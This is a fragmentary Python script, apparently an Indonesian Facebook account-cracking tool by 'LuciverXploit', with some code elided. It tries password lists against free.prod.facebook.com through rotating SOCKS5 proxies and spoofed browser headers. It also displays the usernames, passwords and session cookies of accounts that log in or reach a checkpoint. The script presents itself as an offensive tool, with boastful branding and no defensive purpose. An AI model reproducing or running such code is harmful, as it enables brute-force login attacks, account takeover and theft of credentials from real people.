...
#JANGAN LUPA FOLLOW GITHUB GUA LICIVERXPLOIT
...
def clear():
	os.system('clear')
def Logo_Bangsat():
	Luciver_Xploit_Emang_Ganteng(panel(f"""[bold red]     _____                                                       
  __|___  |__  ____    ____    __    ____    ____    __  ____    
 |   ___|    ||    \  |    | _|  |_ |    \  |    \  /  ||    \   [bold white]
  `-.`-.     ||     \ |    ||_    _||     \ |     \/   ||     \  
 |______|  __||__|\__\|____|  |__|  |__|\__\|__/\__/|__||__|\__\ 𝗩•𝟮
    |_____|             [bold white]𝘽𝙮 [bold red]𝙻𝚞𝚌𝚒𝚟𝚎𝚛𝚇𝚙𝚕𝚘𝚒𝚝 [bold green]C̳o̳d̳e̳r̳ [bold yellow]   """,width=90,padding=(0,8),title=f"[bold yellow]亗 [bold green]𝙻𝚞𝚌𝚒𝚟𝚎𝚛𝚇𝚙𝚕𝚘𝚒𝚝 [bold yellow]亗",style=f"bold green"))		
def Login_Tai():
	os.system('clear')
	Logo_Bangsat()
	Luciver_Xploit_Emang_Ganteng(panel(f"                              [bold white]𝙰𝙺𝚄 𝙰𝙳𝙰𝙻𝙰𝙷 [bold red]𝙻𝚄𝙲𝙸𝚅𝙴𝚁[bold white]𝚇𝙿𝙻𝙾𝙸𝚃",width=90,title=f"[bold yellow]乂 [bold red]𝚆𝙰𝚁𝙽[bold white]𝙸𝙽𝙶! [bold yellow]乂",style=f"bold green"))
...
def Menu_Gua():
	...
	Kamu_Pericode_Yang_Handal.append(panel(f'[bold yellow]×͜×[bold red]𝙻𝚞𝚌𝚒𝚟𝚎𝚛[bold white]𝚇𝚙𝚕𝚘𝚒𝚝𝙱𝙾𝚈[bold yellow]亗',width=28,padding=(0,3),style=f"bold green"))
...
def setting():	
	...
	if pwplus in ['03','3']:
		...
		pwpluss.append('no')	
	Luciver_Xploit_Emang_Ganteng(panel(f'[bold white]𝙰𝚙𝚊𝚔𝚊𝚑 𝙺𝚊𝚖𝚞 𝙸𝚗𝚐𝚒𝚗 𝙼𝚎𝚗𝚊𝚖𝚙𝚒𝚕𝚔𝚊𝚗 𝙰𝚙𝚕𝚒𝚔𝚊𝚜𝚒 𝚈𝚊𝚗𝚐 𝚃𝚎𝚛𝚔𝚊𝚒𝚝 𝙳𝚒 𝙳𝚊𝚕𝚊𝚖 𝙰𝚔𝚞𝚗 ? 𝚈/𝚃',width=90,padding=(0,8),title=f"[bold yellow]×͜× [bold red]𝚂𝙴𝚃𝚃𝙸𝙽𝙶 [bold white]𝙰𝙿𝙻𝙸??𝙰𝚂𝙸 [bold yellow]×͜×",style=f"bold green"))	
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					Luciver_Xploit_Emang_Ganteng(panel(f'[bold white]USERNAME : {idf}\nPASSWORD : {pw}',width=90,padding=(0,8),title=f"[bold yellow]×͜× [bold red]𝚂𝙴𝚃𝚃𝙸𝙽𝙶 [bold white]𝚄𝚂𝙴𝚁𝙶𝙴𝙽𝚃 [bold yellow]×͜×",style=f"bold green"))	
					Luciver_Xploit_Emang_Ganteng(panel(f'[bold white]USERAGENT : {ua}',width=90,padding=(0,8),style=f"bold green"))	
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='Akun_Berhasil_Login')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Akun_Terkena_Checkpoint')
...
def bapi(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "free.prod.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
